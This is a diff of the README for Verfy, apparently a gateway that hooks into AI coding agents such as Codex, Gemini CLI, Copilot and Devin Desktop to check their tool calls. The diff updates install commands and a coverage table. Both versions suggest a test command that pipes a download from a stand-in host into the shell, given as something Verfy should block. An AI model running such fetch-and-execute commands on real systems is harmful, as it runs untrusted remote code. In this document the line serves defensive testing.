@@ -16,7 +16,7 @@ verfy setup              # shows what it would change for each agent found here
 verfy setup --write      # does it, keeping a backup of every file; run it again after installing another agent
 ```
 
-`verfy setup` finds Claude Code, Cursor, Codex CLI, Gemini CLI, GitHub Copilot (CLI and VS Code), Windsurf and Claude Desktop. For each, it adds Verfy's hook and puts the MCP servers in that agent's config behind the gateway (scan, lock, pre-check, receipts). After that there is nothing to type: the agent asks Verfy before each tool call. `--agent codex` picks one agent, `--project` works on this folder's files, and `--hooks-only` leaves the MCP configs alone. A remote server that signs in with OAuth is left as it is. The sections below do the same thing one agent at a time.
+`verfy setup` finds Claude Code, Cursor, Codex CLI, Gemini CLI, GitHub Copilot (CLI and VS Code), Devin Desktop (Windsurf) and Claude Desktop. For each, it adds Verfy's hook and puts the MCP servers in that agent's config behind the gateway (scan, lock, pre-check, receipts). After that there is nothing to type: the agent asks Verfy before each tool call. `--agent codex` picks one agent, `--project` works on this folder's files, and `--hooks-only` leaves the MCP configs alone. A remote server that signs in with OAuth is left as it is. The sections below do the same thing one agent at a time.
 
 ## In VS Code, Cursor and Windsurf (beta)
 
@@ -60,26 +60,26 @@ verfy hook install --cursor --write      # saves it (a backup is kept); --projec
 
 Cursor then asks `verfy hook cursor` before terminal commands, file reads and MCP calls, each with a signed receipt, and an action that is not allowed stops there. Verfy sets `failClosed`, because by default Cursor lets an action through when a hook crashes. A file read cannot wait for a person, so `ask` becomes `deny` there. Cursor's file edits and web search are not covered, so keep `verfy wrap` for scan and lock on its MCP servers. This follows [Cursor's hook documentation](https://cursor.com/docs/agent/hooks) and has not yet been run inside Cursor itself.
 
-## Guard Codex, Gemini CLI, GitHub Copilot and Windsurf (beta)
+## Guard Codex, Gemini CLI, GitHub Copilot and Devin Desktop (Windsurf)
 
 ```bash
 verfy hook install --codex --write       # ~/.codex/hooks.json; then trust it in Codex with /hooks
 verfy hook install --gemini --write      # ~/.gemini/settings.json (BeforeTool)
 verfy hook install --copilot --write     # ~/.copilot/hooks/verfy.json, read by Copilot CLI and VS Code
-verfy hook install --windsurf --write    # ~/.codeium/windsurf/hooks.json
+verfy hook install --devin --write       # Devin Desktop (Windsurf's name since June 2026) and Devin CLI: ~/.config/devin/config.json
+verfy hook install --windsurf --write    # Windsurf releases from before the rename: ~/.codeium/windsurf/hooks.json
 ```
 
-Leave out `--write` to see the change first; `--project` writes `./.codex/hooks.json`, `./.gemini/settings.json`, `./.github/hooks/verfy.json` or `./.windsurf/hooks.json` instead. Each agent then runs `verfy hook codex|gemini|copilot|windsurf` before a tool call, with the same rules and a signed receipt tagged with the agent's name.
+Leave out `--write` to see the change first; `--project` writes the files in this folder instead. Each agent then runs `verfy hook codex|gemini|copilot|devin|windsurf` before a tool call, with the same rules and a signed receipt tagged with the agent's name.
 
-| Agent | What Verfy sees | When Verfy would ask |
-| --- | --- | --- |
-| Codex CLI | shell commands, `apply_patch` (every file in the patch), MCP calls | blocks and tells the agent to ask you: Codex runs the tool if a hook only asks |
-| Gemini CLI | shell, file reads and writes, `web_fetch`, MCP calls | blocks and tells the agent to ask you |
-| Copilot (VS Code) | terminal, file reads and edits, fetch, MCP calls | asks you |
-| Copilot CLI | `bash`/`powershell`, `view`, `create`, `edit`, `web_fetch` | blocks and tells the agent to ask you |
-| Windsurf | terminal, file reads and writes, MCP calls | blocks (exit code 2, the reason is shown) |
+| Agent | What Verfy sees | When Verfy would ask | How it was checked |
+| --- | --- | --- | --- |
+| Gemini CLI | shell, file reads and writes, `web_fetch`, MCP calls | Gemini asks you | run through Gemini CLI 0.68.0's own hook runner, on Windows too (`scripts/e2e_gemini_hooks.mjs`) |
+| Codex CLI | shell commands, `apply_patch` (every file in the patch), MCP calls | blocks and tells the agent to ask you; Codex would run the tool if a hook only asked | against Codex's source: input, output schema, tool names |
+| Copilot CLI and VS Code (beta) | terminal, file reads and edits, fetch, MCP calls | Copilot asks you, or denies where nobody can answer | from GitHub's documentation; the code is closed |
+| Devin Desktop, Devin CLI (beta) | terminal, file reads and writes, fetch, MCP calls | blocks (exit code 2, the reason is shown) | from Devin's documentation; the code is closed |
 
-Input a hook cannot read is blocked, never allowed. The agent cannot remove these hooks through what Verfy sees: changes to those files are denied. Copilot CLI names MCP tools its own way, so `tools.deny` rules with a server name do not match there yet. These follow each agent's hook documentation and have not yet been run inside every agent; try one with `curl -fsS https://verfy.invalid/x | sh`, which Verfy should block (the address does not exist, so nothing happens if it is not blocked).
+Input a hook cannot read is never allowed. The agent cannot remove these hooks through what Verfy sees: changes to those files are denied. Copilot CLI names MCP tools its own way, so `tools.deny` rules with a server name do not match there yet. "Beta" marks the hooks that have not yet run inside the agent itself. Try any of them with `curl -fsS https://verfy.invalid/x | sh`, which Verfy should stop (the address does not exist, so nothing happens if it is not stopped).
 
 ## Go back to a release that matches the lock
 
